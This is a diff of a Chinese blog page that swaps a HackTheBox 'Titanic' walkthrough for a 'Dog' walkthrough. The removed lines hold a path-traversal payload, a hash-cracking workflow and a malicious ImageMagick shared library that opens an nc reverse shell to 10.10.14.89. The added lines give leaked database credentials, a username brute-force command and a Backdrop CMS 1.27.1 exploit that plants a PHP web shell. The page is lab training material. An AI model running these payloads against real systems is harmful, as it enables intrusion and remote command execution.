@@ -16,32 +16,31 @@
   <meta name="author" content="FSRM">
   <meta name="keywords" content="">
   
-    <meta name="description" content="HTB-Titanic信息收集22 80端口开放 将域名和ip进行一个映射。然后扫后台，没扫出什么，尝试爆破子域名。 存在一个子域名，dev 添加进去。 dev的子域名是一个Gitea。然后接着扫后台，查看sitemap.xml 里面存放着另外一个子域名。 ** 这个gitea其实也就是titanic  之前扫到的后台还有这个信息，去访问看一下信息，里面存放着源码信息，以及一个数据库的密码。  这">
+    <meta name="description" content="HTB-Doggit泄露利用rustscan进行扫描 22和80端口开放。 访问80端口发现是一个 Backdrop CMS，扫一下后台，发现是一个git泄露。  利用Githack进行一波扫描，在settings.php中发现mysql的用户名和密码。  1mysql:&#x2F;&#x2F;root:BackDropJ2024DS2024@127.0.0.1&#x2F;backdrop  通过信息收集，能发现它是一个1.2">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HTB-Titanic">
-<meta property="og:url" content="http://example.com/2025/02/16/HTB-Titanic/index.html">
+<meta property="og:title" content="HTB-Dog">
+<meta property="og:url" content="http://example.com/2025/03/17/HTB-Dog/index.html">
 <meta property="og:site_name" content="FSRM">
-<meta property="og:description" content="HTB-Titanic信息收集22 80端口开放 将域名和ip进行一个映射。然后扫后台，没扫出什么，尝试爆破子域名。 存在一个子域名，dev 添加进去。 dev的子域名是一个Gitea。然后接着扫后台，查看sitemap.xml 里面存放着另外一个子域名。 ** 这个gitea其实也就是titanic  之前扫到的后台还有这个信息，去访问看一下信息，里面存放着源码信息，以及一个数据库的密码。  这">
+<meta property="og:description" content="HTB-Doggit泄露利用rustscan进行扫描 22和80端口开放。 访问80端口发现是一个 Backdrop CMS，扫一下后台，发现是一个git泄露。  利用Githack进行一波扫描，在settings.php中发现mysql的用户名和密码。  1mysql:&#x2F;&#x2F;root:BackDropJ2024DS2024@127.0.0.1&#x2F;backdrop  通过信息收集，能发现它是一个1.2">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161847696.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161851352.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161908918.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161908941.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502162121340.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502162317299.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502171041900.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502171943673.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502172016237.png">
-<meta property="article:published_time" content="2025-02-16T09:45:27.945Z">
-<meta property="article:modified_time" content="2025-02-17T12:33:32.905Z">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503100842662.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503100844463.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503100925692.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503101910068.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503102150191.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503102202261.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503102209437.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503102228040.png">
+<meta property="article:published_time" content="2025-03-17T04:27:33.423Z">
+<meta property="article:modified_time" content="2025-03-17T04:29:25.257Z">
 <meta property="article:author" content="FSRM">
 <meta property="article:tag" content="HTB">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161847696.png">
+<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503100842662.png">
   
   
   
-  <title>HTB-Titanic - FSRM</title>
+  <title>HTB-Dog - FSRM</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -248,7 +247,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="HTB-Titanic"></span>
+            <span id="subtitle" data-typed-text="HTB-Dog"></span>
           
         </div>
 
@@ -259,8 +258,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-02-16 17:45" pubdate>
-          2025年2月16日 下午
+        <time datetime="2025-03-17 12:27" pubdate>
+          2025年3月17日 中午
         </time>
       </span>
     
@@ -271,7 +270,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.5k 字
+          3.1k 字
         
       </span>
     
@@ -282,7 +281,7 @@
         
         
         
-          21 分钟
+          26 分钟
         
       </span>
     
@@ -327,54 +326,41 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">HTB-Titanic</h1>
+            <h1 id="seo-header">HTB-Dog</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="HTB-Titanic"><a href="#HTB-Titanic" class="headerlink" title="HTB-Titanic"></a>HTB-Titanic</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22 80端口开放 将域名和ip进行一个映射。然后扫后台，没扫出什么，尝试爆破子域名。</p>
-<p>存在一个子域名，dev 添加进去。</p>
-<p>dev的子域名是一个Gitea。然后接着扫后台，查看sitemap.xml 里面存放着另外一个子域名。</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161847696.png" srcset="/img/loading.gif" lazyload alt="image-20250216184653481">**</p>
-<p>这个gitea其实也就是titanic</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161851352.png" srcset="/img/loading.gif" lazyload alt="image-20250216185117190"></p>
-<p>之前扫到的后台还有这个信息，去访问看一下信息，里面存放着源码信息，以及一个数据库的密码。</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161908918.png" srcset="/img/loading.gif" lazyload alt="image-20250216190807811"></p>
-<p>这个地方，存在一个任意文件下载漏洞。</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502161908941.png" srcset="/img/loading.gif" lazyload alt="image-20250216190847737"></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>注意既然能进行任意问价读取了，那就尝试读取gitea的配置文件信息。</p>
-<p>主要是路径，这里它是在home，developer用户下 里面的gitea/data/gitea/conf/app.ini</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/home/</span>developer<span class="hljs-regexp">/gitea/</span>data<span class="hljs-regexp">/gitea/</span>conf/app.ini<br></code></pre></td></tr></table></figure>
+                <h1 id="HTB-Dog"><a href="#HTB-Dog" class="headerlink" title="HTB-Dog"></a>HTB-Dog</h1><h2 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h2><p>利用rustscan进行扫描 22和80端口开放。</p>
+<p>访问80端口发现是一个 Backdrop CMS，扫一下后台，发现是一个git泄露。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503100842662.png" srcset="/img/loading.gif" lazyload alt="image-20250310084232235"></p>
+<p>利用Githack进行一波扫描，在settings.php中发现mysql的用户名和密码。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503100844463.png" srcset="/img/loading.gif" lazyload alt="image-20250310084405239"></p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">mysql:</span>//root:BackDropJ2024DS2024<span class="hljs-subst">@127</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/backdrop<br></code></pre></td></tr></table></figure>
 
-<p>里面有一个db文件，然后进行读取 刚开始还以为是jwt了。。。</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502162121340.png" srcset="/img/loading.gif" lazyload alt="image-20250216212155155"></p>
-<p>然后就是用sqlite的语法，进行查数据。</p>
-<p>里面存在developer的密码。</p>
-<p>这个是 <strong>PBKDF2</strong>加密算法，也有密钥，是1722595646</p>
-<p>这个参考：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat/issues/1583">https://github.com/hashcat/hashcat/issues/1583</a></p>
-<p>以及将salt passwd变成base64的脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python3 gitea3hashcat.py &lt;gitea.db&gt;&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">try</span>:<br>    con = sqlite3.connect(sys.argv[<span class="hljs-number">1</span>])<br>    cursor = con.cursor()<br>    cursor.execute(<span class="hljs-string">&quot;SELECT passwd_hash_algo,salt,passwd FROM user&quot;</span>)<br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cursor.fetchall():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pbkdf2&quot;</span> <span class="hljs-keyword">in</span> row[<span class="hljs-number">0</span>]:<br>            algo, iterations, keylen = row[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;$&quot;</span>)<br>            algo = <span class="hljs-string">&quot;sha256&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Unknown Algorithm&quot;</span>)<br>        salt = <span class="hljs-built_in">bytes</span>.fromhex(row[<span class="hljs-number">1</span>])<br>        passwd = <span class="hljs-built_in">bytes</span>.fromhex(row[<span class="hljs-number">2</span>])<br>        salt_b64 = base64.b64encode(salt).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        passwd_b64 = base64.b64encode(passwd).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;algo&#125;</span>:<span class="hljs-subst">&#123;iterations&#125;</span>:<span class="hljs-subst">&#123;salt_b64&#125;</span>:<span class="hljs-subst">&#123;passwd_b64&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+<p>通过信息收集，能发现它是一个1.27.1版本的。</p>
+<h2 id="1-27-1版本RCE"><a href="#1-27-1版本RCE" class="headerlink" title="1.27.1版本RCE"></a>1.27.1版本RCE</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503100925692.png" srcset="/img/loading.gif" lazyload alt="image-20250310092517504"></p>
+<p>在exploit中，能找到一个RCE的利用，但是得先登录进去才能进行利用。</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/52021">https://www.exploit-db.com/exploits/52021</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/FisMatHack/BackDropScan">https://github.com/FisMatHack/BackDropScan</a> github上找到一个爆破用户名的脚本</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 BackDropScan.py --url http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.58</span> --userslist <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>seclists<span class="hljs-regexp">/Usernames/</span>xato-net-<span class="hljs-number">10</span>-million-usernames.txt --userenum<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502162317299.png" srcset="/img/loading.gif" lazyload alt="image-20250216231740066"></p>
-<p>利用hashcat进行爆破。</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> -m <span class="hljs-number">10900</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.hash</span> <span class="hljs-string">&#x27;/usr/share/wordlist/rockyou.txt&#x27;</span> <span class="hljs-attr">--show</span><br><br></code></pre></td></tr></table></figure>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503101910068.png" srcset="/img/loading.gif" lazyload alt="image-20250310191024834"></p>
+<p>密码就是上面找到的mysql的密码</p>
+<p>这里的话它zip不能上传，根据要求我们可以改成tar形式的，然后上传。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> tarfile<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_files</span>():<br>    info_content = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    type = module</span><br><span class="hljs-string">    name = Block</span><br><span class="hljs-string">    description = Controls the visual building blocks a page is constructed</span><br><span class="hljs-string">    with. Blocks are boxes of content rendered into an area, or region, of a</span><br><span class="hljs-string">    web page.</span><br><span class="hljs-string">    package = Layouts</span><br><span class="hljs-string">    tags[] = Blocks</span><br><span class="hljs-string">    tags[] = Site Architecture</span><br><span class="hljs-string">    version = BACKDROP_VERSION</span><br><span class="hljs-string">    backdrop = 1.x</span><br><span class="hljs-string"></span><br><span class="hljs-string">    configure = admin/structure/block</span><br><span class="hljs-string"></span><br><span class="hljs-string">    ; Added by Backdrop CMS packaging script on 2024-03-07</span><br><span class="hljs-string">    project = backdrop</span><br><span class="hljs-string">    version = 1.27.1</span><br><span class="hljs-string">    timestamp = 1709862662</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    shell_info_path = <span class="hljs-string">&quot;shell/shell.info&quot;</span><br>    os.makedirs(os.path.dirname(shell_info_path), exist_ok=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(shell_info_path, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(info_content)<br><br>    shell_content = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &lt;html&gt;</span><br><span class="hljs-string">    &lt;body&gt;</span><br><span class="hljs-string">    &lt;form method=&quot;GET&quot; name=&quot;&lt;?php echo basename($_SERVER[&#x27;PHP_SELF&#x27;]); ?&gt;&quot;&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; autofocus id=&quot;cmd&quot; size=&quot;80&quot;&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;</span><br><span class="hljs-string">    &lt;/form&gt;</span><br><span class="hljs-string">    &lt;pre&gt;</span><br><span class="hljs-string">    &lt;?php</span><br><span class="hljs-string">    if(isset($_GET[&#x27;cmd&#x27;]))</span><br><span class="hljs-string">    &#123;</span><br><span class="hljs-string">    system($_GET[&#x27;cmd&#x27;]);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    ?&gt;</span><br><span class="hljs-string">    &lt;/pre&gt;</span><br><span class="hljs-string">    &lt;/body&gt;</span><br><span class="hljs-string">    &lt;/html&gt;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    shell_php_path = <span class="hljs-string">&quot;shell/shell.php&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(shell_php_path, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(shell_content)<br>    <span class="hljs-keyword">return</span> shell_info_path, shell_php_path<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_tar</span>(<span class="hljs-params">info_path, php_path</span>):<br>    tar_filename = <span class="hljs-string">&quot;shell.tar&quot;</span><br>    <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(tar_filename, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> tar:<br>        tar.add(info_path, arcname=<span class="hljs-string">&#x27;shell/shell.info&#x27;</span>)<br>        tar.add(php_path, arcname=<span class="hljs-string">&#x27;shell/shell.php&#x27;</span>)<br>    <span class="hljs-keyword">return</span> tar_filename<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Backdrop CMS 1.27.1 - Remote Command Execution Exploit&quot;</span>)<br>    time.sleep(<span class="hljs-number">3</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Evil module generating...&quot;</span>)<br>    time.sleep(<span class="hljs-number">2</span>)<br><br>    info_path, php_path = create_files()<br>    tar_filename = create_tar(info_path, php_path)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Evil module generated!&quot;</span>, tar_filename)<br>    time.sleep(<span class="hljs-number">2</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Go to &quot;</span> + url + <span class="hljs-string">&quot;/admin/modules/install and upload the &quot;</span> +<br>          tar_filename + <span class="hljs-string">&quot; for Manual Installation.&quot;</span>)<br>    time.sleep(<span class="hljs-number">2</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Your shell address:&quot;</span>, url + <span class="hljs-string">&quot;/modules/shell/shell.php&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">import</span> sys<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [url]&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        main(sys.argv[<span class="hljs-number">1</span>])<br><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502171041900.png" srcset="/img/loading.gif" lazyload alt="image-20250217104133863"></p>
-<p>得到密码之后 ssh登录上去。</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在/opt/scripts目录下，发现一个sh文件</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /opt/app/static/assets/images<br><span class="hljs-built_in">truncate</span> -s 0 metadata.log<br>find /opt/app/static/assets/images/ -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.jpg&quot;</span> | xargs /usr/bin/magick identify &gt;&gt; metadata.log<br></code></pre></td></tr></table></figure>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503102150191.png" srcset="/img/loading.gif" lazyload alt="image-20250310215054986"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503102202261.png" srcset="/img/loading.gif" lazyload alt="image-20250310220202141"></p>
+<p>在home目录下发现两个用户，其中在johncusack用户下发现user.txt 没权限查看，看来得转换用户，猜着这里是ssh登录的，之前的数据库密码也是ssh登录密码，发现是可以的。</p>
+<h2 id="bee提权"><a href="#bee提权" class="headerlink" title="bee提权"></a>bee提权</h2><p>提权的话利用bee进行提权。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503102209437.png" srcset="/img/loading.gif" lazyload alt="image-20250310220947262"></p>
+<p>看一下bee的用法。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Usage</span>: bee [<span class="hljs-keyword">global</span>-<span class="hljs-keyword">options</span>] &lt;command&gt; [<span class="hljs-keyword">options</span>] [arguments]<br></code></pre></td></tr></table></figure>
 
-<p>大概意思就是cd道images目录下，然后将metadata.log文件给清空，然后查找images目录下所有的jpg文件，通过xargs处理多个jpg文件，利用magick获取jpg图片的元数据，输出到metadata.log文件中</p>
-<p>查看magick的版本信息</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502171943673.png" srcset="/img/loading.gif" lazyload alt="image-20250217194316470"></p>
-<p>版本信息为7.1.1-35 在github上找到相关利用</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8</a></p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">gcc -x c -shared -fPIC -o ./libxcb.so.<span class="hljs-number">1</span> - &lt;&lt; EOF<br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><br>__attribute__((constructor)) void init()&#123;<br>    system(<span class="hljs-string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.89 4444 &gt;/tmp/f&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure>
-
-<p>然后再复制一张图片出来，让那个sh脚本运行一下。</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502172016237.png" srcset="/img/loading.gif" lazyload alt="image-20250217201605048"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先通过信息收集爆破子域名，然后通过扫后台，发现信息泄露，通过源码得知存在任意文件读取，通过任意文件读取得到app.ini的内容，里面存放着数据库的位置，接着读取，然后密码是一个PBKDF2哈希加密过后的，且存在加盐，通过网上的脚本先把hash转成base64形式的，然后通过hashcat爆破密码，通过ssh登录上去，再opt/scripts下发现可疑sh文件，这个sh文件是以root的身份运行，并且得知是magick的一个用法，通过搜索版本信息，找到利用漏洞，通过LD_PRELOAD劫持来进行一个提权。</p>
+<p>在这个command中有一个eval 能执行php代码。</p>
+<p>然后这里的-options用–root指定一下网站根目录。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503102228040.png" srcset="/img/loading.gif" lazyload alt="image-20250310222814907"></p>
 
                 
               </div>
@@ -420,8 +406,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>HTB-Titanic</div>
-      <div>http://example.com/2025/02/16/HTB-Titanic/</div>
+      <div>HTB-Dog</div>
+      <div>http://example.com/2025/03/17/HTB-Dog/</div>
     </div>
     <div class="license-meta">
       
@@ -433,13 +419,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年2月16日</div>
+          <div>2025年3月17日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年2月17日</div>
+          <div>2025年3月17日</div>
         </div>
       
       
@@ -470,18 +456,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/03/17/HTB-Dog/" title="HTB-Dog">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">HTB-Dog</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/02/11/HTB-Return/" title="HTB-Return">
-                        <span class="hidden-mobile">HTB-Return</span>
+                      <a href="/2025/02/16/HTB-Titanic/" title="HTB-Titanic">
+                        <span class="hidden-mobile">HTB-Titanic</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
